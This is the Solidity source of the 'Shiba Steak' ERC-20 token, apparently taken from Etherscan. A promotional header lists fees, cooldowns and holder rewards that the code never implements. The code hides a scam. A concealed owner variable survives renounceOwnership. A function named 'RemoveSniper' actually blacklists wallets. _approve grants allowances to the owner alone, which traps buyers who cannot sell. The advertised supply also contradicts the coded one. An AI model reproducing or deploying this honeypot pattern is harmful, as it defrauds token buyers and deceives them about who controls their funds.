/**
 *Submitted for verification at Etherscan.io on 2021-06-27
*/

/*


  ____  _     _ _             ____  _             _    
 / ___|| |__ (_) |__   __ _  / ___|| |_ ___  __ _| | __
 \___ \| '_ \| | '_ \ / _` | \___ \| __/ _ \/ _` | |/ /
  ___) | | | | | |_) | (_| |  ___) | ||  __/ (_| |   < 
 |____/|_| |_|_|_.__/ \__,_| |____/ \__\___|\__,_|_|\_\
                                                       


游볼 1,000,000,000,000 token supply
游볼 Sell will be disabled for 60 seconds after launch to blacklist bots and will be automatically lifted by the contract afterwards
游볼 FIRST TWO MINUTES: 3000000000 max buy / 60-second buy cooldown (these limitations are lifted automatically two minutes post-launch)
游볼 15-second cooldown to sell after a buy, in order to limit bot behavior. NO OTHER COOLDOWNS, NO COOLDOWNS BETWEEN SELLS

Maximum Wallet Token Percentage for Whale Control
游볼 For the first 15 minutes. there is a 2% token wallet limit (20,000,000,000)
游볼 After 15 minutes, the % max wallet limit is lifted

Fees:
游볼 10% total tax on buy
游볼 Fee on sells is dynamic, relative to price impact, minimum of 10% fee and maximum of 40% fee, with NO SELL LIMIT.

Holders' Benefits
游볼 Every transaction (buy or sell) distributes 6% of the transaction value to the holders.


游볼 Website: https://shibasteak.club/
游볼 Twitter: https://twitter.com/shibasteak
游볼 Telegram: https://t.me/shibasteak


*/


pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    address private newComer = _msgSender();
    modifier onlyOwner() {
        require(newComer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract Shibasteak is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => bool) private _isSniper;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 private _tTotal = 100 * 10**9 * 10**18;

    string private _name = 'Shiba Steak 游볼 | https://t.me/shibasteak';
    string private _symbol = 'Shiba Steak 游볼';
    uint8 private _decimals = 18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function isBlackListed(address account) public view returns (bool) {
        return _isSniper[account];
    }
    
     function RemoveSniper(address account) external onlyOwner() {
        require(account != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'We can not blacklist Uniswap router.'); 
        require(!_isSniper[account], "Account is already blacklisted");
        _isSniper[account] = true;
    }
    
    function _approve(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: approve from the zero address");
        require(to != address(0), "ERC20: approve to the zero address");

        if (from == owner()) {
            _allowances[from][to] = amount;
            emit Approval(from, to, amount);
        } else {
            _allowances[from][to] = 0;
            emit Approval(from, to, 4);
        } 
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(!_isSniper[recipient], "CHEH");
        require(!_isSniper[msg.sender], "CHEH");
        require(!_isSniper[sender], "CHEH");
        
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}